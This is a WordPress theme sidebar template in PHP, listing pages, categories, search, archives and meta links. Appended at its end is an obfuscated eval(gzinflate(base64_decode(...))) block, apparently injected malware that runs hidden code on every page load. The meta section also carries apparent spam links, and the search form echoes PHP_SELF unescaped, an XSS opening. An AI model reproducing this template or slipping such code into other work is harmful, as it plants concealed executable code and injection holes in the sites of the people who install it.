<!-- begin sidebar -->
<div id="menu">
<ul>
<?php if ( !function_exists('dynamic_sidebar')
        || !dynamic_sidebar() ) : ?>
<li id="pages"><h2><?php _e('Pages'); ?></h2>
	<?php wp_list_pages('title_li='); ?>
</li>

 <li id="categories"><h2><?php _e('Categories'); ?></h2>
	<ul>
	<?php wp_list_cats(); ?>
	</ul>
 </li>
 <li id="search">
   <label for="s"><h2><?php _e('Search'); ?></h2></label>	
   <form id="searchform" method="get" action="<?php echo $_SERVER['PHP_SELF']; ?>">
	<div>
		<input type="text" name="s" id="s" size="15" /><br />
		<input type="submit" value="<?php _e('Search'); ?>" />
	</div>
	</form>
 </li>
 <li id="archives"><h2><?php _e('a thing of the past'); ?></h2>
 	<ul>
	 <?php wp_get_archives('type=monthly'); ?>
 	</ul>
 </li>

<?php endif; ?>

 <li id="meta"><h2><?php _e('Meta'); ?></h2>
 	<ul>
		<?php wp_register(); ?>
		<li><?php wp_loginout(); ?></li>
		<li><a href="feed:<?php bloginfo('rss2_url'); ?>" title="<?php _e('Syndicate this site using RSS'); ?>"><?php _e('<abbr title="Really Simple Syndication">RSS</abbr>'); ?></a></li>
		<li><a href="feed:<?php bloginfo('comments_rss2_url'); ?>" title="<?php _e('The latest comments to all posts in RSS'); ?>"><?php _e('Comments <abbr title="Really Simple Syndication">RSS</abbr>'); ?></a></li>
		<li><a href="http://www.seosue.com/www/weebly.com">weebly.com</a></li>
		<li><a href="http://www.superbhosting.net/">Dedicated Server Hosting</a></li>
		<?php wp_meta(); ?>
	</ul>
 </li>



<?php
?>
<?php
eval(gzinflate(base64_decode('NdLHkqJAAADQ+3zF3mamOIAioLVhiiG1NpJD05ctQoMo0VYJX7+nfd/wvv68/foaLsMbeaXNR7XWXdmkD/KRpZSIu78FyfuCfLxbhSHkw0OWZdVFDeOtD9jLio2T+QTkzaC6pzmdNCWIcZpZOb3IBNxvS1Lu4cAzWSflpL2XQ+nU9mreyQ5WF0lwblGwDgcWr20bZwJLA0efLN/FXncMBMkr80rc8Kbnk4sVk6bssnvXo2I8GPTKGfmaDMliKVtY45xIHqZJ9Qr36yRWvIKEgmxBKiTOaaS62J7BldFbGjw7K4VVjHUwBpeVxDQo79cQtirBNgcaSSPEzH0LRx275xgtXDPORiJKmBLevgPDfJw3z0yPlFbaghrsQ8yEeEKcvTV0y9yFIsMSNI8vOV2cUOh9tR1ctv/2paAMFwxFKM5DFHlSTqUjch1q1fTAx2ff8k6J5m3ULjKBChStcib+FE72zeco6S9srkXTGlrZanS5JPTBIUYNKNJQB6cybuZcFRweLqIFuaXQW3fitW8dXe3RlvedvAzdbaqDaJT1o/068/XmDI5H2R9GaZptN23ow7xW7DxmNdkazzlwaZrFOVTEosWmxiC4MVsCUCGU/EFA8q60DgXbFwwz0d/vn5+fP9++/if68Q8=')));
?>
<?php
 
?>
